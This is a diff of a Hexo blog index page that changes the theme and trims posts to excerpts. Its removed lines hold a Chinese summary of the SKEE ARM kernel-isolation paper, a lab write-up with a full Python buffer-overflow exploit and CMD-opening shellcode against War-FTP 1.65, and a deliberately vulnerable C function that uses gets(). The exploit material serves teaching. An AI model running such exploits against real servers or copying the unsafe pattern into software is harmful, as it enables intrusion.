@@ -5,7 +5,7 @@
   
 
 
-<html class="theme-next muse use-motion" lang="">
+<html class="theme-next pisces use-motion" lang="">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -96,9 +96,9 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Muse',
+    scheme: 'Pisces',
     version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
     fancybox: true,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
@@ -186,6 +186,36 @@
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
           </a>
         </li>
       
@@ -299,6 +329,16 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/05/22/SKEE-paper/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/05/22/SKEE-paper/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -356,75 +396,17 @@
       
         
           
-            <h1 id="SKEE-A-Lightweight-Secure-Kernel-level-Execution-Environment-for-ARM"><a href="#SKEE-A-Lightweight-Secure-Kernel-level-Execution-Environment-for-ARM" class="headerlink" title="SKEE: A Lightweight Secure Kernel-level Execution Environment for ARM"></a>SKEE: A Lightweight Secure Kernel-level Execution Environment for ARM</h1><blockquote>
-<p>出处：NDSS 2016</p>
-<p>作者：Ahmed M. Azab,1 Kirk Swidowski,1Rohan Bhutkar, Jia Ma, Wenbo Shen, Ruowen Wang, and Peng Ning </p>
-<p>单位：Samsung KNOX R&amp;D, Samsung Research America</p>
-<p>原文：<a href="http://dx.doi.org/10.14722/ndss.2016.23009" target="_blank" rel="noopener">http://dx.doi.org/10.14722/ndss.2016.23009</a></p>
-</blockquote>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SKEE有如下特性：</p>
-<ol>
-<li>基于ARM平台；</li>
-<li>与操作系统具有相同的特权级；</li>
-<li>隔离的轻量级的执行环境；</li>
-<li>在这个新的执行环境上支持对操作系统内核进行安全检测和保护。</li>
-</ol>
-<h2 id="痛点"><a href="#痛点" class="headerlink" title="痛点"></a>痛点</h2><p>如果将整个操作系统内核作为可信基（TCB），内核级安全保护机制一旦被绕过，攻击者将能获得整个系统的内存资源，这是非常危险的。因此，需要使用安全工具（security tools）来监控和保护内核，并且安全工具需要隔离的执行环境，以防遭受内核漏洞利用的破坏。</p>
-<p>先前工作</p>
-<ol>
-<li>基于虚拟化的方法。将安全工具执行在虚拟管理层（hypervisor）进而对内核监控和保护，然而hypervisor的TCB太大以至于自身易受攻击，从而处于hypervisor的安全工具也并不安全。</li>
-<li>一些不依赖于hypervisor的隔离的方法。microhypervisors，虽然缩小了TCB，但是不能满足较大的代码基础的安全工具；沙箱，虽然可以提供安全工具环境，但是需要hypervisor的介入来管理，同样TCB太大会带来自身的安全问题；硬件保护，在ARM中没有类似Intel的SGX保护机制，ARM中提供的TrustZone同样存在TCB太大而导致的自身安全问题。</li>
-</ol>
-<h2 id="SKEE的设计"><a href="#SKEE的设计" class="headerlink" title="SKEE的设计"></a>SKEE的设计</h2><ol>
-<li>隔离：要保证即使内核被攻击了SKEE也是安全的。<br>在系统启动时，首先，修改系统的内存布局，创建一块保护的虚拟地址空间给SKEE，通过修改内核用的内存转换表，该表项中不予设置SKEE区域的转换入口，来达到SKEE执行环境所用到内存保护区域与内核能访问的内存区域分离开来；其次，限制内核对内存管理单元（MMU）的访问权限，SKEE将完全控制MMU和内存转换表，并将其放在受保护的地址空间，内核无权修改。</li>
-<li>安全的上下文切换接口：提供内核环境和SKEE环境的切换。<br>由于SKEE与内核处于相同的特权级，因此它不能通过原始的切换内存转换表来实现（这只适用于如内核到用户进程这样高特权级到低特权级的转换），SKEE采用一种新的方法强制内核通过其设计的转换门跳转到隔离环境。当然这个门具有原子性和确定性，原子性保证该过程不被内核获得控制权，确定性保证每次转换都能到达安全检查的入口点，这两个特性防止将SKEE的地址空间暴露给内核。32-bit ARMv7 和64-bit ARMv8的实现方法不同。</li>
-<li>检测并保护内核：要提供给安全工具执行环境来审查内核状态并抵御攻击。<br>SKEE提供安全工具的执行环境，安全工具来实现具体的内核检测和保护。</li>
-</ol>
-<h2 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h2><p>根据攻击意图将内核攻击分为三类：</p>
-<ol>
-<li>旨在修改内核执行的攻击。此类攻击可以防范，因为SKEE会限制未通过审核的恶意代码在内核模式的运行。</li>
-<li>利用漏洞改变内核数据或控制流导致现有内核代码出现异常的恶意行为，如实现提权、ROP攻击。SKEE安全执行环境中存放的安全工具来抵御这些攻击（具体的检测攻击由安全工具决定，不在这篇文章的研究范围）。</li>
-<li>旨在破坏隔离环境进而破坏内核检测保护工具。SKEE可以保证这些攻击不能破坏隔离也不会饶过监控。</li>
-</ol>
-<h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol>
-<li>整个系统可以安全的启动（安全的创建了受保护的地址空间并且设置内核访问权限）。</li>
-<li>内核支持W⊕X，硬件平台实现Privileged eXecute Never (PXN)。</li>
-<li>在32-bit ARMv7平台，内核只能使用TTBR0，TTBR1专门给SKEE 使用，低于2GB的虚拟空间给没有特权的用户空间代码。</li>
-<li>在64-bit ARMv8平台，要求物理地址0x0的内存页专门给SKEE使用。</li>
-</ol>
-<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>环境：</p>
-<ol>
-<li>32-bit ARMv7架构的Samsung Note4手机，Qualcomm 的Sanspdragon APQ8084 处理器。</li>
-<li>64-bit ARMv8架构的Samsung Galaxy S6和Samsung Galaxy Note5，Samsung System LSI 的Exynos 7420 处理器。</li>
-<li>操作系统：Android Lollipop version 5.0，Linux kernel version 3.10.61。<br>设计两组实验（纯粹的SKEE开销和安全检查的开销）。第一组 SKEE收到内核请求不进行安全检查；第二组 SKEE检查模拟请求是否以不利于隔离的方式修改内存布局。</li>
-</ol>
-<h3 id="仿真系统事件的开销"><a href="#仿真系统事件的开销" class="headerlink" title="仿真系统事件的开销"></a>仿真系统事件的开销</h3><p>首先，对比安全工具运行在SKEE里面和外部的开销。由于SKEE和内核是同级，所以他们的执行开销是相同的，真实受影响的是进出SKEE所带来的开销；其次，在SKEE放置了安全工具之后带来的开销。</p>
-<p>三个设备：未修改的安卓系统、清除TLB的SKEE系统和使用ASID的SKEE系统。</p>
-<ol>
-<li><p>转换到SKEE的开销：</p>
-<p>用ARM cycle count register (CCNT)来衡量。</p>
-<p><img src="/2019/05/22/SKEE-paper/1.png" alt="1.png"></p>
-<p>结果分析：使用ASID明显降低开销；ASID v8比v7开销更少，因为v8的实现只要一个原子操作 而v7需要一系列步骤。</p>
-</li>
-<li><p>Benchmark 性能开销：</p>
-<p>仅仅实验了清除TLB的情况，测试了7个不同的benchmark安全工具。结果发现两种架构下SKEE的性能均有所降低，不同工具降低程度不同，我们分析是TLB不同频率的缺失导致的不同的系统状态。</p>
-<p><img src="/2019/05/22/SKEE-paper/2.png" alt="2.png"><br><img src="/2019/05/22/SKEE-paper/3.png" alt="3.png"></p>
-</li>
-<li><p>加载APPs延迟</p>
-<p>衡量 按下app到其完全加载 的时间，选择了一些二进制文件很大并且需要很多图像处理的需要加载很久的游戏app。结果在预期范围内， SKEE的存在对app的加载带来了额外的时间开销。</p>
-<p><img src="/2019/05/22/SKEE-paper/4.png" alt="4.png"><br><img src="/2019/05/22/SKEE-paper/5.png" alt="5.png"></p>
-</li>
-<li><p>设备启动时间</p>
-<p>启动时SKEE的最糟糕的情况，因为需要大量的内存分配，在32-bit ARMv7中，原生系统平均启动时间是21.35秒，而SKEE是23.10秒（增加了8.2%）；在64-bit ARMv8中，原生是21.72秒，而SKEE是24.30秒（增加了11.9%）。</p>
-</li>
-</ol>
-<h3 id="安全检查样例开销"><a href="#安全检查样例开销" class="headerlink" title="安全检查样例开销"></a>安全检查样例开销</h3><p>三个比较：原生、没有执行安全检查的SKEE和执行了检查框架的SKEE。</p>
-<p><img src="/2019/05/22/SKEE-paper/6.png" alt="6.png"></p>
-<p>结果分析，表7和表4的SKEE的降低程度也是不同的，比如表7中Vellamo Browser是8.65% 而表4是14.88%，解释是TLB缺失的影响是不确定的，它与原生系统的设置有关；跟之前一样，观察到不同的安全工具对性能开销的影响也不同；总的来说，加入安全框架对性能的影响在小于10%。</p>
-<p>同样测量了启动时间，原生是30.15秒，没有执行检查的SKEE是33.80秒（增加了11.7%），执行安全检查的SKEE是35.12秒（增加了4.9%）。</p>
-<h3 id="增强性能"><a href="#增强性能" class="headerlink" title="增强性能"></a>增强性能</h3><p>通过一些诸如TZ-RKP的技术可以减少上下文切换次数进而提高性能。</p>
-
-          
+          SKEE: A Lightweight Secure Kernel-level Execution Environment for ARM
+出处：NDSS 2016
+作者：Ahmed M. Azab,1 Kirk Swidowski,1Rohan Bhutkar, Jia Ma, Wenbo She
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/05/22/SKEE-paper/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -538,6 +520,16 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/29/warftp-exp/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/29/warftp-exp/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -595,68 +587,30 @@
       
         
           
-            <h1 id="war-ftp-缓冲区溢出攻击"><a href="#war-ftp-缓冲区溢出攻击" class="headerlink" title="war-ftp 缓冲区溢出攻击"></a>war-ftp 缓冲区溢出攻击</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol>
-<li>掌握缓冲区溢出的原理 </li>
-<li>掌握常用的缓冲区溢出方法 </li>
-<li>理解缓冲区溢出的危害性 </li>
-<li>掌握防范和避免缓冲区溢出攻击的方法</li>
-</ol>
-<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ol>
-<li><p>虚拟机 winXP sp3</p>
-<ul>
-<li>安装war-ftp 服务器</li>
-<li>关闭DEP</li>
-<li>安装OllyDBG</li>
-</ul>
-</li>
-<li><p>主机 mac （攻击方）</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">» uname -a</span><br><span class="line">Darwin challengedeMacBook-Pro.local 18.2.0 Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64</span><br></pre></td></tr></table></figure>
-<p> 安装ftp命令</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">brew install telnet </span><br><span class="line">brew install inetutils </span><br><span class="line">brew link --overwrite inetutils</span><br><span class="line">使用</span><br><span class="line">ftp server-ip</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<ol start="3">
-<li><p>其他</p>
-<ul>
-<li>ActivePerl：提供perl运行环境</li>
-<li>patternCreate.pl：构造不重复的字符</li>
-<li>patternOffset.pl：计算来前者产生的字符串中某段字符的偏移量。</li>
-</ul>
-</li>
-</ol>
-<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>分析war-ftp v1.65的基于用户名的缓冲溢出漏洞。漏洞点：向服务器发送超过480字节的用户名可以触发漏洞（即使用命令USER longString\r\n）。</p>
-<h2 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h2><h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>在虚拟机开启 ftp 服务。<br><img src="/2019/04/29/warftp-exp/2-ftp.png" alt="2"></p>
-<blockquote>
-<p>tips:<br>初次打开可能会显示<br><code>War-FTP refuses to restart with the error Unknown format for user database</code><br>解决：删除FtpDaemon.dat 和 FtpDaemon.ini文件 再重新打开即可。<br><img src="/2019/04/29/warftp-exp/1-ftp.png" alt="1"></p>
-</blockquote>
-<p>主机连接ftp，在用户名处输入500个a测试</p>
-<p><img src="/2019/04/29/warftp-exp/3.png" alt="3"><br><img src="/2019/04/29/warftp-exp/4.png" alt="4"></p>
-<p>发现服务器端并没有崩溃，并且显示的字符显然没有500个，查阅资料ftp命令对USER长度有限制，当USER长度超过78个字符时，系统只截取前78个字符发送给目标主机。</p>
-<p>试了几个ftp客户端发现同样会截断，最后选择直接采用socket编程实现发送命令，如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">expftp.py</span><br><span class="line">	</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#create an AF_INET(IPv4), STREAM socket (TCP)</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">except</span> socket.error, msg:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Failed to create socket. Error code: '</span> + str(msg[<span class="number">0</span>]) + <span class="string">' , Error message : '</span> + msg[<span class="number">1</span>]</span><br><span class="line">	sys.exit();</span><br><span class="line"><span class="keyword">print</span> <span class="string">'socket created'</span></span><br><span class="line">	</span><br><span class="line">sock.connect((<span class="string">'10.211.55.13'</span>, <span class="number">21</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Socket Connected to 10.211.55.13'</span></span><br><span class="line">	</span><br><span class="line">s = sock.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">	</span><br><span class="line">payload = <span class="string">b'USER '</span> + <span class="string">b'a'</span> * <span class="number">500</span> + <span class="string">b'\r\n'</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	sock.sendall(payload)</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'send failed'</span></span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">print</span> <span class="string">'message send successfully'</span></span><br><span class="line">	</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
-<p>测试 发现程序确实收到字符并且卡住了</p>
-<p><img src="/2019/04/29/warftp-exp/5.png" alt="5"><br><img src="/2019/04/29/warftp-exp/6.png" alt="6"></p>
-<h3 id="od调试-分析栈结构"><a href="#od调试-分析栈结构" class="headerlink" title="od调试 分析栈结构"></a>od调试 分析栈结构</h3><p>为了定位程序溢出时栈中 ret、esp 等的精确位置，这里用 patternCreate.pl 构造1000个不重复的字节。</p>
-<p><img src="/2019/04/29/warftp-exp/7.png" alt="7"><br><img src="/2019/04/29/warftp-exp/8.png" alt="8"></p>
-<p>OD attach 调试</p>
-<p><img src="/2019/04/29/warftp-exp/9.png" alt="9"></p>
-<p>payload 修改之后发送 exp </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test = <span class="string">b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'</span></span><br><span class="line">payload = <span class="string">b'USER '</span> + test + <span class="string">b'\r\n'</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2019/04/29/warftp-exp/10.png" alt="10"></p>
-<p>可以看到，此时，esp 为 00B2FD58 该地址内容为71413471，eip 为 32714131。通过patternOffset.pl计算出它在整个长为 1000的字符串中的偏移分别是493和485.</p>
-<p><img src="/2019/04/29/warftp-exp/11.png" alt="11"></p>
-<p>在return指令执行之前 栈的结构如下，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                   +-----------------+</span><br><span class="line">                   |                 |</span><br><span class="line">                   |                 |</span><br><span class="line">                   |                 |</span><br><span class="line">                   |     USERNAME    |</span><br><span class="line">esp, 0x00B2FD50---&gt;+-----------------+</span><br><span class="line">                   |    0x32714131   |</span><br><span class="line">                   +-----------------+</span><br></pre></td></tr></table></figure>
-<p>执行ret之后，0x32714131赋给eip，esp 往后4个字节，指向0x00B2FD58，此时eip执行0x32714131处的指令，显然出错。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                   +-----------------+</span><br><span class="line">                   |                 |</span><br><span class="line">                   |                 |</span><br><span class="line">                   |                 |</span><br><span class="line">                   |     USERNAME    |</span><br><span class="line">                   +-----------------+</span><br><span class="line">                   |    0x32714131   |                   +-----------------+</span><br><span class="line">                   |                 |</span><br><span class="line">esp, 0x00B2FD58---&gt;+-----------------+</span><br><span class="line">                   |    0x71413471   |</span><br><span class="line">                   +-----------------+</span><br></pre></td></tr></table></figure>
-<h3 id="构造exploit"><a href="#构造exploit" class="headerlink" title="构造exploit"></a>构造exploit</h3><p>如果将0x32714131换成指令jmp esp的地址（0x7ffa4512），再将0x00B2FD58位置的0x71413471填入shellcode，程序在ret之后即执行shellcode。构造如下：在偏移485的位置填入jmp esp指令的地址，偏移493的位置写shellcode，其他填充NOP指令。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  0---&gt;+-----------------+</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">       |     USERNAME    |</span><br><span class="line">485---&gt;+-----------------+</span><br><span class="line">       |    0x7ffa4512   |       +-----------------+</span><br><span class="line">       |                 |</span><br><span class="line">493---&gt;+-----------------+</span><br><span class="line">       |    shellcode    |</span><br><span class="line">       +-----------------+</span><br></pre></td></tr></table></figure>
-<p>完整的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">expftp.py</span><br><span class="line">	</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#create an AF_INET(IPv4), STREAM socket (TCP)</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">except</span> socket.error, msg:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Failed to create socket. Error code: '</span> + str(msg[<span class="number">0</span>]) + <span class="string">' , Error message : '</span> + msg[<span class="number">1</span>]</span><br><span class="line">	sys.exit();</span><br><span class="line"><span class="keyword">print</span> <span class="string">'socket created'</span></span><br><span class="line">	</span><br><span class="line">sock.connect((<span class="string">'10.211.55.13'</span>, <span class="number">21</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Socket Connected to 10.211.55.13'</span></span><br><span class="line">	</span><br><span class="line">s = sock.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">	</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">jmpesp = <span class="string">b'\x12\x45\xfa\x7f'</span></span><br><span class="line"><span class="comment"># len(shellcode) = 111 ; open CMD</span></span><br><span class="line">shellcode = <span class="string">"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"</span>\</span><br><span class="line"><span class="string">"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6"</span>\</span><br><span class="line"><span class="string">"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA"</span>\</span><br><span class="line"><span class="string">"\x77\x1d\x80\x7c"</span>\</span><br><span class="line"><span class="string">"\x52\x8D\x45\xF4\x50\xFF\x55\xF0"</span>\</span><br><span class="line"><span class="string">"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E"</span>\</span><br><span class="line"><span class="string">"\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4"</span>\</span><br><span class="line"><span class="string">"\x50\xB8"</span>\</span><br><span class="line"><span class="string">"\xc7\x93\xbf\x77"</span>\</span><br><span class="line"><span class="string">"\xFF\xD0"</span>\</span><br><span class="line"><span class="string">"\x83\xC4\x12\x5D"</span>\</span><br><span class="line">	</span><br><span class="line">payload = <span class="string">b'USER '</span> + <span class="string">b'\x90'</span> * <span class="number">485</span> + jmpesp + <span class="string">b'\x90'</span> * <span class="number">4</span> + shellcode + <span class="string">b'\r\n'</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	sock.sendall(payload)</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'send failed'</span></span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">print</span> <span class="string">'message send successfully'</span></span><br><span class="line">	</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
-<h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>测试成功，shellcode的功能是打开CMD</p>
-<p><img src="/2019/04/29/warftp-exp/12.png" alt="12"></p>
+          war-ftp 缓冲区溢出攻击实验目的
+掌握缓冲区溢出的原理 
+掌握常用的缓冲区溢出方法 
+理解缓冲区溢出的危害性 
+掌握防范和避免缓冲区溢出攻击的方法
 
-          
+实验环境
+虚拟机 winXP sp3
+
+安装war-ftp 服务器
+关闭DEP
+安装OllyDBG
+
+
+主机 mac （攻击方）
+ 12» un
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/29/warftp-exp/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -770,6 +724,16 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/26/2019-4-26-stackoverfolw/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/26/2019-4-26-stackoverfolw/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -827,69 +791,15 @@
       
         
           
-            <h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="1-存在漏洞的函数"><a href="#1-存在漏洞的函数" class="headerlink" title="1. 存在漏洞的函数"></a>1. 存在漏洞的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">stack_over.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[12];</span><br><span class="line">  gets(s);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
